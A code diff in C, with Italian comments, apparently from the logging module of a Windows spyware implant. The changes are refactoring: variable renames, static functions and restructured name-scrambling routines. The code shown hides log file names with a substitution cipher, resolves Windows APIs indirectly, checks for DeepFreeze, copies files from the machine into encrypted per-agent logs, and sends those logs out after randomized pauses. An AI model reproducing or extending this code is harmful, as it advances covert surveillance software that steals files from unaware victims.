@@ -73,11 +73,11 @@ extern BOOL IsDeepFreeze();
 #define LOG_SIZE_MAX ((DWORD)1024*1024*100) //100MB
 DWORD GetLogSize(char *path)
 {
-	HANDLE hfile = FNC(CreateFileA)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-	if (hfile != INVALID_HANDLE_VALUE) {
+	HANDLE hFile = FNC(CreateFileA)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	if (hFile != INVALID_HANDLE_VALUE) {
 		DWORD hi_dim = 0, lo_dim = 0;
-		lo_dim = FNC(GetFileSize)(hfile, &hi_dim);
-		CloseHandle(hfile);
+		lo_dim = FNC(GetFileSize)(hFile, &hi_dim);
+		CloseHandle(hFile);
 		if (hi_dim == 0 && lo_dim != INVALID_FILE_SIZE)
 			return lo_dim;
 	}
@@ -86,7 +86,7 @@ DWORD GetLogSize(char *path)
 }
 
 // Inserisce un elemento nella lista dei log da spedire in ordine di tempo
-BOOL InsertLogList(LIST_ENTRY *head, WIN32_FIND_DATA *log_elem)
+static BOOL InsertLogList(LIST_ENTRY *head, WIN32_FIND_DATA *log_elem)
 {
 	// Alloca e inizializza il nuovo elemento
 	LOG_LIST* new_elem = (LOG_LIST*)malloc(sizeof(LOG_LIST));
@@ -118,7 +118,7 @@ BOOL InsertLogList(LIST_ENTRY *head, WIN32_FIND_DATA *log_elem)
 }
 
 // Libera la lista dei log
-void FreeLogList(LIST_ENTRY *head)
+static void FreeLogList(LIST_ENTRY *head)
 {
 	LIST_ENTRY* next = head->Flink;
 
@@ -139,11 +139,8 @@ void LOG_SendPause(DWORD min_sleep, DWORD max_sleep)
 {
 	DWORD sleep_time;
 
-	if (min_sleep > MAX_SLEEP_PAUSE)
-		min_sleep = MAX_SLEEP_PAUSE;
-
-	if (max_sleep > MAX_SLEEP_PAUSE)
-		max_sleep = MAX_SLEEP_PAUSE;
+	min_sleep = (min_sleep > MAX_SLEEP_PAUSE) ? MAX_SLEEP_PAUSE : min_sleep;
+	max_sleep = (max_sleep > MAX_SLEEP_PAUSE) ? MAX_SLEEP_PAUSE : max_sleep;
 
 	if (min_sleep > max_sleep || max_sleep == 0)
 		return;
@@ -414,7 +411,7 @@ LOG_ENTRY_STRUCT* FindByTag(DWORD agent_tag)
 BOOL LOG_InitAgentLog(DWORD agent_tag)
 {
 	DWORD i;
-	HANDLE h_file;
+	HANDLE hFile;
 	char log_wout_path[128];
 	char file_name[DLLNAMELEN];
 	char binary_tag[64];
@@ -436,14 +433,14 @@ BOOL LOG_InitAgentLog(DWORD agent_tag)
 	HM_CompletePath(scrambled_name, file_name);
 	SAFE_FREE(scrambled_name);
 
-	h_file = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, 0, NULL);
-	if (h_file == INVALID_HANDLE_VALUE)
+	hFile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
 		return FALSE;
 	if (GetLastError() == ERROR_ALREADY_EXISTS )
 		newly_created = FALSE;
 	else
 		newly_created = TRUE;
-	FNC(SetFilePointer)(h_file, 0, NULL, FILE_END);
+	FNC(SetFilePointer)(hFile, 0, NULL, FILE_END);
 			
 	// Se e' un file nuovo, ci inserisc l'header
 	if (newly_created) {
@@ -451,8 +448,8 @@ BOOL LOG_InitAgentLog(DWORD agent_tag)
 		BYTE *log_header;
 				
 		log_header = Log_CreateHeader(agent_tag, NULL, 0, &out_len);
-		if (!log_header || shared.log_free_space<out_len || !FNC(WriteFile)(h_file, log_header, out_len, &dummy, NULL)) {
-			CloseHandle(h_file);
+		if (!log_header || shared.log_free_space<out_len || !FNC(WriteFile)(hFile, log_header, out_len, &dummy, NULL)) {
+			CloseHandle(hFile);
 			SAFE_FREE(log_header);
 			FNC(DeleteFileA)(file_name);
 			return FALSE;
@@ -460,19 +457,19 @@ BOOL LOG_InitAgentLog(DWORD agent_tag)
 		SAFE_FREE(log_header);
 		if (shared.log_free_space >= out_len)
 			shared.log_free_space -= out_len;
-		FNC(FlushFileBuffers)(h_file);
+		FNC(FlushFileBuffers)(hFile);
 	}
 
 	// Cerca una entry vuota e la riempie (solo se 
 	// riesce ad aprire il file)
 	LOG_ENTRY_STRUCT* ptr = (LOG_ENTRY_STRUCT*)malloc(sizeof(LOG_ENTRY_STRUCT));
 	if (ptr == NULL) {
-		CloseHandle(h_file);
+		CloseHandle(hFile);
 		FNC(DeleteFileA)(file_name);
 		return FALSE;
 	}
 
-	ptr->hFile = h_file;
+	ptr->hFile = hFile;
 	ptr->agent_tag = agent_tag;
 	InsertTailList(&log_list_head, &ptr->entry);
 	return TRUE;
@@ -559,64 +556,66 @@ BOOL LOG_ReportLog(DWORD agent_tag, BYTE *buff, DWORD buff_len)
 // E' Thread SAFE
 char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt)
 {
+	DWORD i, j;
+
 	char alphabet[ALPHABET_LEN]={'_','B','q','w','H','a','F','8','T','k','K','D','M',
 		                         'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
 		                         'i','b','U','I','e','y','l','J','W','h','j','0','m',
                                  '5','o','2','E','r','L','t','6','v','G','R','N','9',
 					             's','Y','1','n','3','P','p','c','7','g','-','C'};                  
-	char *ret_string;
-	DWORD i,j;
+	char* ret_string = _strdup(string);
 
-	if ( !(ret_string = _strdup(string)) )
-		return NULL;
+	if (ret_string != NULL)
+	{
+		// Evita di lasciare i nomi originali anche se il byte e' 0
+		scramble %= ALPHABET_LEN;
+		if (scramble == 0)
+			scramble = 1;
 
-	// Evita di lasciare i nomi originali anche se il byte e' 0
-	scramble%=ALPHABET_LEN;
-	if (scramble == 0)
-		scramble = 1;
-
-	for (i=0; ret_string[i]; i++) {
-		for (j=0; j<ALPHABET_LEN; j++)
-			if (ret_string[i] == alphabet[j]) {
-				// Se crypt e' TRUE cifra, altrimenti decifra
-				if (crypt)
-					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
-				else
-					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
-				break;
-			}
+		for (i = 0; ret_string[i]; i++) {
+			for (j = 0; j < ALPHABET_LEN; j++)
+				if (ret_string[i] == alphabet[j]) {
+					// Se crypt e' TRUE cifra, altrimenti decifra
+					if (crypt)
+						ret_string[i] = alphabet[(j + scramble) % ALPHABET_LEN];
+					else
+						ret_string[i] = alphabet[(j + ALPHABET_LEN - scramble) % ALPHABET_LEN];
+					break;
+				}
+		}
 	}
 	return ret_string;
 }
 
 char *LOG_ScrambleName2(char *string, BYTE scramble, BOOL crypt)
 {
+	DWORD i, j;
+
 	char alphabet[ALPHABET_LEN]={'a','_','q','T','w','B','H','W','K','F','D','M','k',		                      
 		                         'i','U','m','I','e','l','J','8','y','h','j','b','0',
 								 'f','4','z','Q','O','9','S','x','u','X','A','V','Z',
                                  '3','7','2','E','L','r','t','G','6','v','C','N','d',
 					             's','5','p','o','Y','n','1','c','g','P','R','-'};                  
-	char *ret_string;
-	DWORD i,j;
+	char* ret_string = _strdup(string);
 
-	if ( !(ret_string = _strdup(string)) )
-		return NULL;
+	if (ret_string != NULL)
+	{
+		// Evita di lasciare i nomi originali anche se il byte e' 0
+		scramble %= ALPHABET_LEN;
+		if (scramble == 0)
+			scramble = 1;
 
-	// Evita di lasciare i nomi originali anche se il byte e' 0
-	scramble%=ALPHABET_LEN;
-	if (scramble == 0)
-		scramble = 1;
-
-	for (i=0; ret_string[i]; i++) {
-		for (j=0; j<ALPHABET_LEN; j++)
-			if (ret_string[i] == alphabet[j]) {
-				// Se crypt e' TRUE cifra, altrimenti decifra
-				if (crypt)
-					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
-				else
-					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
-				break;
-			}
+		for (i = 0; ret_string[i]; i++) {
+			for (j = 0; j < ALPHABET_LEN; j++)
+				if (ret_string[i] == alphabet[j]) {
+					// Se crypt e' TRUE cifra, altrimenti decifra
+					if (crypt)
+						ret_string[i] = alphabet[(j + scramble) % ALPHABET_LEN];
+					else
+						ret_string[i] = alphabet[(j + ALPHABET_LEN - scramble) % ALPHABET_LEN];
+					break;
+				}
+		}
 	}
 	return ret_string;
 }
@@ -842,12 +841,8 @@ BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_nam
 	BYTE *log_file_header;
 	FileAdditionalData *file_additiona_data_header;
 	DWORD header_len;
-	WCHAR *to_display;
-
-	if (display_name)
-		to_display = display_name;
-	else
-		to_display = src_path;
+	
+	WCHAR* to_display = (display_name) ? display_name : src_path;
 
 	// Crea l'header da scrivere nel file
 	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
@@ -1009,7 +1004,6 @@ BOOL Log_CryptCopyEmptyFile(WCHAR *src_path, char *dest_file_path, WCHAR *displa
 // se la destinazione non ha la stessa data della sorgente.
 BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD agent_tag)
 {
-	HANDLE hfile;
 	BY_HANDLE_FILE_INFORMATION src_info, dst_info;
 	char red_fname[100];
 	char log_wout_path[_MAX_FNAME];
@@ -1023,14 +1017,14 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 	HANDLE hFind = INVALID_HANDLE_VALUE;
 	
 	// Prende le informazioni del file sorgente
-	hfile = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
-	if (hfile == INVALID_HANDLE_VALUE)
+	HANDLE hFile = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
 		return FALSE;
-	if (!FNC(GetFileInformationByHandle)(hfile, &src_info)) {
-		CloseHandle(hfile);
+	if (!FNC(GetFileInformationByHandle)(hFile, &src_info)) {
+		CloseHandle(hFile);
 		return FALSE;
 	}
-	CloseHandle(hfile);
+	CloseHandle(hFile);
 
 	// Check se e' una directory
 	if (src_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
@@ -1074,13 +1068,13 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 	}
 
 	// Prende le info del file destinazione (se esiste)
-	hfile = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
-	if (hfile != INVALID_HANDLE_VALUE) {
-		if (!FNC(GetFileInformationByHandle)(hfile, &dst_info)) {
-			CloseHandle(hfile);
+	hFile = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hFile != INVALID_HANDLE_VALUE) {
+		if (!FNC(GetFileInformationByHandle)(hFile, &dst_info)) {
+			CloseHandle(hFile);
 			return FALSE;
 		}
-		CloseHandle(hfile);
+		CloseHandle(hFile);
 
 		// Compara le date dei due file (evita riscritture dello stesso file)
 		src_date.hi_delay = src_info.ftLastWriteTime.dwHighDateTime;
@@ -1822,7 +1816,7 @@ void LOG_CloseLogConnection()
 
 void LOG_SendStatusLog(const WCHAR* msg)
 {
-	HANDLE hfile = Log_CreateFile(PM_STATUSLOG, NULL, 0);
-	Log_WriteFile(hfile, (BYTE*)msg, (wcslen(msg) + 1) * sizeof(WCHAR));
-	Log_CloseFile(hfile);
+	HANDLE hFile = Log_CreateFile(PM_STATUSLOG, NULL, 0);
+	Log_WriteFile(hFile, (BYTE*)msg, (wcslen(msg) + 1) * sizeof(WCHAR));
+	Log_CloseFile(hFile);
 }
